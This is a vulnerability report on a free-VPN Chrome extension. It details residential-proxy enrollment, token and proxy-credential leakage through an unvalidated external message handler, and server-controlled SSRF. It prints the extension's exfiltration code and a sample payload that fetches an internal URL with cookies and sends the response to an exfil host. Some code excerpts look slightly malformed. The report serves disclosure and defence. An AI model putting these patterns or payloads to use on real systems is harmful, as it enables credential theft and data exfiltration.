# Vulnerability Report: Chrome Web Store Extension

**Extension ID:** ndnjhdibigaajocbimcalfpncnniaogo
**Name:** Chrome Web Store
**Version:** 1.7.126
**User Count:** ~0 users
**Developer:** Marcode Ltd (freevpnext.com)
**Analysis Date:** 2026-02-08

---

## Executive Summary

This extension masquerades as a free VPN proxy service but operates a **residential proxy network** that silently enrolls users as exit nodes for routing third-party traffic through their IP addresses. The extension contains multiple critical vulnerabilities including an **externally-accessible message handler that leaks authentication tokens and proxy credentials**, a **server-controlled SSRF mechanism** that can fetch arbitrary URLs and exfiltrate complete responses, and **user-agent spoofing** functionality. While marketed as a privacy tool, the extension deliberately bypasses Google Analytics through its own VPN tunnel to enable real IP tracking of users who believe they are protected.

**Overall Risk: HIGH**

The extension exhibits patterns consistent with residential proxy vendors (similar to Hola VPN, Urban VPN) and contains multiple attack vectors that could be exploited to frame users for malicious activity, steal credentials, or enable SSRF attacks.

---

## Vulnerability Details

### 1. Residential Proxy Network (P2P Exit Node Enrollment)

**Severity:** CRITICAL
**Category:** Residential Proxy Vendor, Data Exfiltration
**Files:** `background.min.js` (lines 939-1019), `static/unblock/unblock.js`

**Description:**

The extension implements a P2P Unblocking Cloud feature that enrolls users as residential proxy exit nodes. When enabled, the extension:

1. Sends a heartbeat POST request every 60 seconds to `https://connect.freevpnext.com/api/pc?t={timestamp}` announcing availability
2. Attaches full user authentication token and privacy preferences in the `X-Preferences` header
3. Allows the server to coordinate routing third-party traffic through the user's IP address

**Code Evidence:**

```javascript
// background.min.js line 964
v = setInterval(async () => {
  if (!G) try {
    G = !0, I = Date.now(), !(await m())?.p2pUnblockingCloud)
    await x();
    let o = Date.now();
    await p(`${d}/api/pc?t=${o}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      cache: "no-store"
    })
  } catch {
    I = Date.now()
  } finally {
    G = !1
  }
}, 6e4)  // 60 seconds
```

When a user requests content through P2P, the server returns arbitrary HTML that is injected wholesale into the document:

```javascript
// static/unblock/unblock.js line 21
document.documentElement.innerHTML = page.html;
```

**Impact:**

- Users unknowingly become exit nodes for a residential proxy network
- The server operator can route arbitrary traffic (including illegal content) through users' IP addresses
- Users have no visibility or logs of what content was fetched through their connection
- Law enforcement could trace malicious activity back to the user's IP
- Similar to documented abuse cases with Hola VPN

**Disclosure:** The i18n description mentions "your browser will be configured to help other users access blocked sites by retrieving content for them or the Free VPN Next Pro network as required" but this is buried in an expandable section and severely understates the implications.

**Verdict:** CRITICAL - This is a residential proxy network that could be used to frame users for criminal activity.

---

### 2. Authentication Token and Proxy Credential Leakage via External Messages

**Severity:** CRITICAL
**Category:** Credential Harvesting, Data Exfiltration
**Files:** `background.min.js` (lines 1065-1235)

**Description:**

The extension registers the SAME message handler for both internal and external messages without any sender validation:

```javascript
// background.min.js line 1234
chrome.runtime.onMessageExternal.addListener(ue);
chrome.runtime.onMessage.addListener(ue);
```

Any website matching `*://*.freevpnext.com/*` (per `externally_connectable` in manifest) can send messages and trigger privileged actions including:

1. **`getToken`** - Returns the JWT authentication token
2. **`getState`** - Returns complete VPN state including `enabledProxy` object with host, port, login, and password
3. **`setPrivacyFeature`** - Can enable P2P exit node feature remotely
4. **`connectVPN`** - Forces VPN connection to attacker-specified country
5. **`p2pUnblock`** - Triggers arbitrary content fetching via P2P network

**Code Evidence:**

```javascript
// background.min.js lines 1111-1114
case "getState":
  return u().then(o => {
    r(o)  // Returns full state object including enabledProxy credentials
  }), !0;

// lines 1133-1136
case "getToken":
  return chrome.storage.sync.get(["token"]).then(o => {
    r(o.token)
  }), !0;
```

The state object at lines 855-862 contains:

```javascript
await f({
  connected: !0,
  connecting: !1,
  enabledProxy: {
    ...i,
    host: E.host,
    port: E.port,
    login: i.login,      // Proxy credentials
    password: i.password  // Proxy credentials
  },
  // ...
  ip: N
})
```

**Impact:**

- Any compromised or malicious subdomain of `freevpnext.com` can steal the user's JWT token
- Proxy credentials (username/password for the HTTP proxy) are leaked to any `*.freevpnext.com` page
- External pages can remotely enable P2P exit node feature without user interaction
- External pages can force VPN connections to attacker-controlled countries
- No origin validation or sender verification whatsoever

**Verdict:** CRITICAL - Complete authentication bypass and credential leakage to any subdomain.

---

### 3. Server-Controlled SSRF and Request/Response Exfiltration

**Severity:** HIGH
**Category:** Data Exfiltration, SSRF
**Files:** `background.min.js` (lines 108-164)

**Description:**

The `fetchWithAuth` function implements a server-controlled HTTP 308 redirect mechanism that enables SSRF attacks:

```javascript
// background.min.js lines 133-136
if (c && h.status === 308) {
  let l = await h.json();
  return p(l.a, l.b, l.c)  // Recursive call with server-supplied URL, options, error config
}
```

When a server responds with HTTP 308, the extension:
1. Parses `{a, b, c}` from the response body
2. Fetches the URL in `l.a` (can be ANY domain) with fetch options from `l.b`
3. If the request fails OR if `l.c` is set, exfiltrates the complete response to a server-controlled endpoint

**Error exfiltration payload:**

```javascript
// background.min.js lines 156-163
body: c(JSON.stringify({
  u: t,           // Original request URL
  o: r,           // Original fetch options (may include auth headers)
  h: Object.fromEntries(await o.headers.entries()),  // ALL response headers
  b: await o.text()  // FULL response body
}))
```

**Impact:**

- Server can redirect any API call to arbitrary URLs (SSRF)
- Complete responses (including Set-Cookie headers, auth tokens, API responses) are exfiltrated
- Can chain multiple redirects recursively
- Server can fetch internal services and exfiltrate the results
- Attack chain: 308 redirect to internal endpoint → exfiltrate response to attacker server

**Example exploit:**
1. Server responds to `/api/proxy/countries` with 308 redirect
2. Redirect payload: `{a: "https://internal-corp.example.com/api/secrets", b: {method: "GET", credentials: "include"}, c: {a: "https://exfil.freevpnext.com/collect", b: {method: "POST"}}}`
3. Extension fetches internal URL with user's cookies
4. Complete response exfiltrated to attacker endpoint

**Verdict:** HIGH - Server-controlled SSRF with full response exfiltration.

---

### 4. Google Analytics Proxy Bypass (Real IP Leakage)

**Severity:** MEDIUM
**Category:** Data Exfiltration, Privacy Violation
**Files:** `background.min.js` (line 329)

**Description:**

The proxy bypass list explicitly includes `google-analytics.com` and `www.google.com`:

```javascript
// background.min.js line 329
bypassList: [
  "<local>", "127.0.0.1", "localhost",
  C,  // vpn.freevpnext.com
  d.replace("https://", ""),  // connect.freevpnext.com
  "www.google.com",
  "google-analytics.com"  // <-- REAL IP EXPOSED
]
```

**Impact:**

- When VPN is connected, Google Analytics requests bypass the proxy and expose the user's real IP address
- Google search requests (`www.google.com`) also bypass the proxy
- Defeats the stated privacy purpose of the VPN
- Allows correlation of real IP with proxied browsing activity
- Same pattern documented in VeePN (used to track users despite VPN connection)

**Verdict:** MEDIUM - Deliberate privacy violation, real IP tracking despite active VPN.

---

### 5. User-Agent Spoofing via DeclarativeNetRequest

**Severity:** LOW-MEDIUM
**Category:** XSS Protection Bypass, Device Fingerprinting
**Files:** `background.min.js` (lines 454-581)

**Description:**

When `deviceUnblocker` feature is enabled, the extension installs declarativeNetRequest rules that modify User-Agent headers based on query parameters:

```javascript
// background.min.js lines 454-485
{
  id: 1,
  priority: 1,
  action: {
    type: "modifyHeaders",
    requestHeaders: [{
      header: "User-Agent",
      operation: "set",
      value: "Mozilla/5.0 (Linux; Android 10; K) ..."
    }, {
      header: "sec-fetch-mode",
      operation: "set",
      value: "navigate"
    }, ...]
  },
  condition: {
    urlFilter: "*?*mfd=a*",  // Triggers on ANY URL with mfd=a parameter
    resourceTypes: ["main_frame", "sub_frame", "xmlhttprequest"]
  }
}
```

Rules for `?mfd=a` (Android), `?mfd=i` (iPhone), `?mfd=w` (Windows), `?mfd=m` (macOS).

**Impact:**

- URL parameters can trigger User-Agent spoofing on any website
- Could be used for bypassing device-based restrictions
- Modifies security headers (`sec-fetch-mode`, `sec-fetch-dest`) which may bypass certain XSS protections
- Broad scope - affects all URLs matching the pattern

**Verdict:** LOW-MEDIUM - User-initiated feature but has broad scope and could enable abuse.

---

### 6. Canvas Fingerprint Modification

**Severity:** INFO (False Positive)
**Category:** Dynamic Code Execution
**Files:** `src/contentscript/content.min.js` (lines 11-17)

**Description:**

When `antiFingerprint` feature is enabled, the content script patches `HTMLCanvasElement.prototype.toDataURL`:

```javascript
// content.min.js lines 11-16
HTMLCanvasElement.prototype.toDataURL = function() {
  let c = this.getContext("2d");
  for (let m = 0; m < 100; m++)
    c.fillStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.1)`,
    c.fillRect(Math.random() * this.width, Math.random() * this.height, 1, 1);
  return t.apply(this, arguments)
}
```

**Verdict:** CLEAN - This is a legitimate anti-fingerprinting technique that adds random noise to canvas output.

---

### 7. Fabricated Statistics (User Deception)

**Severity:** INFO
**Category:** User Deception
**Files:** `background.min.js` (lines 862-865)

**Description:**

The VPN speed and server load statistics shown in the UI are completely fabricated:

```javascript
// background.min.js lines 862-865
stats: {
  speed: Math.floor(Math.random() * 50) + 50,  // Random 50-99
  load: Math.floor(Math.random() * 30) + 20     // Random 20-49
}
```

**Verdict:** INFO - Deceptive but not a security vulnerability.

---

## False Positive Analysis

| Pattern | Verdict | Reasoning |
|---------|---------|-----------|
| Canvas fingerprint modification | FALSE POSITIVE | Legitimate anti-fingerprinting protection feature |
| jQuery.js includes `eval` | FALSE POSITIVE | Standard jQuery library, not used for dynamic code execution |
| `btoa` usage | FALSE POSITIVE | Used for base64 encoding preferences header and error reports (legitimate compression) |
| Content script on all URLs | LEGITIMATE USE | Required for keep-alive connection and canvas fingerprinting feature |
| `chrome.browsingData` clearing | LEGITIMATE USE | Standard VPN practice to clear cache on connect/disconnect |

---

## API Endpoints

| Endpoint | Purpose | Risk |
|----------|---------|------|
| `https://connect.freevpnext.com/api/auth/login` | Anonymous JWT authentication | Medium - no credential verification |
| `https://connect.freevpnext.com/api/user/id` | Get server-side user ID | Low |
| `https://connect.freevpnext.com/api/proxy/countries` | List VPN countries | Low |
| `https://connect.freevpnext.com/api/proxy/cities` | List cities for country | Low |
| `https://connect.freevpnext.com/api/proxy/auth` | Get proxy credentials (host/port/login/password) | High - credentials in response |
| `https://connect.freevpnext.com/api/proxy/refresh` | Refresh proxy credentials | High |
| `https://connect.freevpnext.com/api/pc?t={timestamp}` | P2P heartbeat (exit node enrollment) | CRITICAL |
| `https://connect.freevpnext.com/api/unblock` | P2P content fetch request | CRITICAL |
| `http://ip-api.com/json` | IP verification | Low - third-party service |
| `https://tally.so/r/3E6lMl` | Uninstall survey | Low |
| `google-analytics.com` | Analytics (BYPASSES PROXY) | Medium - real IP leak |
| `www.google.com` | Google search (BYPASSES PROXY) | Medium - real IP leak |
| **Server-controlled via 308 redirect** | Arbitrary SSRF target | HIGH |
| **Server-controlled error reporting** | Response exfiltration endpoint | HIGH |

---

## Data Flow Summary

### User Data Collection

1. **Authentication Token:** JWT token stored in `chrome.storage.sync` and sent with every API request
2. **Privacy Preferences:** All feature toggles base64-encoded in `X-Preferences` header on every API call
3. **Real IP Address:** Exposed to Google Analytics and Google.com even when VPN is active
4. **Proxy Credentials:** Leaked to any `*.freevpnext.com` page via `getState` message
5. **VPN State:** Complete connection state (IP, country, proxy host/port) accessible to external messages
6. **P2P Heartbeat:** Announces user availability as exit node every 60 seconds when P2P is enabled

### Third-Party Data Sharing

- Google Analytics receives real IP even when VPN is connected
- P2P network routes arbitrary traffic through user's IP address
- Server can exfiltrate complete request/response data to arbitrary endpoints via 308 redirects

---

## Permissions Analysis

| Permission | Declared | Justified | Notes |
|------------|----------|-----------|-------|
| `storage` | Yes | Yes | VPN state, auth token, preferences |
| `proxy` | Yes | Yes | Required for VPN functionality |
| `privacy` | Yes | Yes | WebRTC protection, secure DNS |
| `browsingData` | Yes | Partial | Cache clearing legitimate, but also enables history/cookie access |
| `webRequest` | Yes | Yes | Proxy authentication |
| `webRequestAuthProvider` | Yes | Yes | MV3 proxy auth requirement |
| `declarativeNetRequest` | Yes | Partial | User-Agent spoofing has broad scope |
| `<all_urls>` host permission | Yes | NO | Overly broad for VPN - enables P2P network and external message attacks |

**Over-Privileged:** The `<all_urls>` host permission is not justified for a VPN extension. It enables:
- Content script injection on all pages (for P2P network)
- Proxy auth on all domains (legitimate)
- External message handler to leak credentials (vulnerability)

---

## What It Does NOT Do

- **No extension enumeration** - Does not use `chrome.management` API
- **No credential harvesting** - No form/password field interception (but leaks own credentials via messages)
- **No keylogging** - No keyboard event listeners
- **No DOM scraping** - Content script only interacts with own domain's meta tags
- **No XHR/fetch hooking** - No prototype patching (canvas patching is anti-fingerprinting)
- **No ad injection** - No ad manipulation code
- **No cookie theft** - Only reads one referral cookie on own domain
- **No clipboard hijacking** - No clipboard API abuse

---

## Overall Risk Assessment

**Risk Level: HIGH**

### Risk Breakdown

- **P2P Residential Proxy Network:** CRITICAL - Users become unwitting exit nodes for arbitrary traffic
- **External Message Credential Leakage:** CRITICAL - Complete authentication bypass via subdomain
- **Server-Controlled SSRF:** HIGH - Can fetch arbitrary URLs and exfiltrate responses
- **Google Analytics Bypass:** MEDIUM - Defeats VPN privacy guarantees
- **User-Agent Spoofing:** LOW-MEDIUM - Broad scope but user-initiated

### Primary Concerns

1. **Residential Proxy Abuse:** The P2P feature operates identically to documented Hola VPN abuse cases. Users can be framed for illegal activity routed through their IP addresses.

2. **Authentication Security:** Any compromised subdomain of `freevpnext.com` can steal JWT tokens and proxy credentials. No sender validation on external messages.

3. **Server Trust:** The server operator has complete control over:
   - What traffic routes through users' IPs (P2P network)
   - Where the extension makes requests (308 redirects)
   - What data gets exfiltrated (error reporting)

4. **Privacy Violations:** Deliberately bypassing Google Analytics through the VPN tunnel defeats the stated privacy purpose and enables real IP tracking.

### Recommended Actions

- **CRITICAL:** Remove P2P Unblocking Cloud feature or require explicit informed consent with clear disclosure of residential proxy implications
- **CRITICAL:** Add sender validation to external message handler - verify `sender.origin` and only allow specific trusted pages
- **HIGH:** Remove 308 redirect mechanism or restrict to same-origin only
- **HIGH:** Remove Google Analytics from proxy bypass list
- **MEDIUM:** Restrict User-Agent spoofing rules to specific domains only

---

## Verdict

**RISK: HIGH**

This extension operates a residential proxy network disguised as a privacy tool. While not traditional malware (no credential theft, ad injection, or keylogging), it contains critical vulnerabilities that could be exploited to:

1. Frame users for criminal activity via P2P exit node traffic
2. Steal authentication tokens via external message handler
3. Conduct SSRF attacks and exfiltrate sensitive data
4. Track users' real IPs despite active VPN connection

The extension exhibits patterns consistent with residential proxy vendors and contains multiple attack surfaces that violate user privacy and security expectations.
